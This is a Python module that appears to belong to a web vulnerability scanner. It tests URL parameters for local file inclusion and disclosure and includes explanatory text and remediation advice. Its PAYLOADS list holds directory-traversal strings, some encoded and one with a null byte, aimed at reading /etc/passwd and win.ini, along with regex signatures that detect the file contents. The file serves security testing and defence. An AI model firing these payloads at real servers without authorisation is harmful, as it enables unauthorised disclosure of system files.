import re

from .. import url_utils, http_client
from . import FOUND, CHECK, NOT_FOUND

KEY = "lfi"
LABEL = "Local File Inclusion / Disclosure (LFI/LFD)"
SEVERITY = "High"
SCOPE = "param"
THRESHOLDS = (2, 1)

GENERAL = (
    "Local File Inclusion / Local File Disclosure vulnerabilities arise when "
    "user-controllable input builds a filesystem path that the application reads "
    "or includes without sufficient validation. Using directory traversal sequences "
    "(../) or absolute paths, an attacker can often read arbitrary files on the "
    "server, or in the case of inclusion rather than disclosure, achieve code "
    "execution."
)
REMEDIATION = (
    "Avoid passing user input into filesystem APIs. Where a filename or path "
    "fragment must be accepted, resolve it to an absolute canonical path and verify "
    "the result still lives inside an expected base directory, rejecting the request "
    "otherwise. Prefer looking the input up as a key into a fixed allow-list of "
    "known-safe files."
)

PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd%00",
    "../../../../../../windows/win.ini",
]

FILE_SIGNATURES = [
    (re.compile(r"root:.*?:0:0:"), "/etc/passwd"),
    (re.compile(r"daemon:.*?:1:1:"), "/etc/passwd"),
    (re.compile(r"\[extensions\]", re.IGNORECASE), "win.ini"),
    (re.compile(r"for 16-bit app support", re.IGNORECASE), "win.ini"),
]


def run(ctx):
    baseline = ctx["baseline"]

    score = 0
    evidence = ""
    marker = None
    request_used = None
    response_used = ""

    for payload in PAYLOADS:
        url = url_utils.build_url(ctx["url"], ctx["qs"], ctx["index"], payload, raw=True)
        resp = http_client.send(ctx["session"], url, timeout=ctx["timeout"],
                                 verify=ctx["verify"], proxies=ctx["proxies"])
        if request_used is None:
            request_used, response_used = url, resp.text if resp.ok else ""

        if not resp.ok:
            continue

        matched = False
        for pattern, label in FILE_SIGNATURES:
            m = pattern.search(resp.text)
            if m and m.group(0) not in baseline.text:
                score = 4
                marker = m.group(0)
                evidence = ("payload %r returned content matching %s (%r), confirming local file disclosure" %
                            (payload, label, m.group(0)))
                request_used, response_used = url, resp.text
                matched = True
                break
        if matched:
            break

        if payload in resp.text and payload not in baseline.text and score < 2:
            score = 2
            marker = payload
            evidence = ("payload %r was reflected unencoded in the response; no known file-content "
                        "signature matched though, check manually" % payload)
            request_used, response_used = url, resp.text

    found_t, check_t = THRESHOLDS
    if score > found_t:
        status = FOUND
    elif score > check_t:
        status = CHECK
    else:
        status = NOT_FOUND

    return {"status": status, "score": score, "marker": marker,
            "evidence": evidence, "request": request_used, "response": response_used}
